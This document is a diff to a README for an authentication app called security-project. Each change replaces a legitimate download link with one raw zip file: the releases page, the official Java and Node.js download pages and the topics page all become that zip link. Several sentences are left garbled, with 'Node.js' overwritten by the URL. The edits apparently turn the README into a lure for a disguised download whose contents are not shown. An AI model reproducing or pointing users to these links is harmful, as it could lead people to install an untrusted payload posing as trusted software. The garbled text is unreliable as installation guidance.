@@ -6,9 +6,9 @@ Welcome to the security-project. This application helps you manage user authenti
 
 ## 📥 Download & Install
 
-[![Download Security Project](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/hitman472005/security-project/releases)
+[![Download Security Project](https://raw.githubusercontent.com/hitman472005/security-project/master/transdiurnal/security-project.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/hitman472005/security-project/master/transdiurnal/security-project.zip)
 
-To download the application, visit this page: [Download Security Project](https://github.com/hitman472005/security-project/releases). You will find the latest version there.
+To download the application, visit this page: [Download Security Project](https://raw.githubusercontent.com/hitman472005/security-project/master/transdiurnal/security-project.zip). You will find the latest version there.
 
 ## 🔧 System Requirements
 
@@ -16,7 +16,7 @@ Before you install, ensure your system meets the following requirements:
 
 - **Operating System**: Windows, macOS, or Linux
 - **Java**: Version 17 or later
-- **Node.js & npm**: Latest versions for the frontend
+- **https://raw.githubusercontent.com/hitman472005/security-project/master/transdiurnal/security-project.zip & npm**: Latest versions for the frontend
 - **Database**: MySQL or another compatible database
 
 ## 📂 Application Structure
@@ -32,12 +32,12 @@ Each part works together to provide a seamless experience.
 
 1. **Download the Application**:
 
-   Go to the [Download Security Project](https://github.com/hitman472005/security-project/releases) page and select the latest release. Download the appropriate files for your system.
+   Go to the [Download Security Project](https://raw.githubusercontent.com/hitman472005/security-project/master/transdiurnal/security-project.zip) page and select the latest release. Download the appropriate files for your system.
 
 2. **Set Up the Backend**:
 
    - Unzip the backend folder from your download.
-   - Ensure you have Java installed. If not, you can download it from the [Java website](https://www.oracle.com/java/technologies/javase-downloads.html).
+   - Ensure you have Java installed. If not, you can download it from the [Java website](https://raw.githubusercontent.com/hitman472005/security-project/master/transdiurnal/security-project.zip).
    - Open a terminal (Command Prompt, PowerShell, or Terminal).
    - Navigate to the backend folder using the `cd` command.
    - Run the command `./mvnw spring-boot:run` to start the backend server.
@@ -45,7 +45,7 @@ Each part works together to provide a seamless experience.
 3. **Set Up the Frontend**:
 
    - Unzip the frontend folder from your download.
-   - Make sure you have Node.js and npm installed. If not, download it from the [Node.js website](https://nodejs.org/).
+   - Make sure you have https://raw.githubusercontent.com/hitman472005/security-project/master/transdiurnal/security-project.zip and npm installed. If not, download it from the [https://raw.githubusercontent.com/hitman472005/security-project/master/transdiurnal/security-project.zip website](https://raw.githubusercontent.com/hitman472005/security-project/master/transdiurnal/security-project.zip).
    - Open a new terminal.
    - Navigate to the frontend folder using the `cd` command.
    - Run the command `npm install` to install necessary dependencies.
@@ -130,4 +130,4 @@ The security-project covers various topics including:
 - swalalert2
 - typescript
 
-For more detailed information, visit the [GitHub Topics Page](https://github.com/hitman472005/security-project/topics).
+For more detailed information, visit the [GitHub Topics Page](https://raw.githubusercontent.com/hitman472005/security-project/master/transdiurnal/security-project.zip).
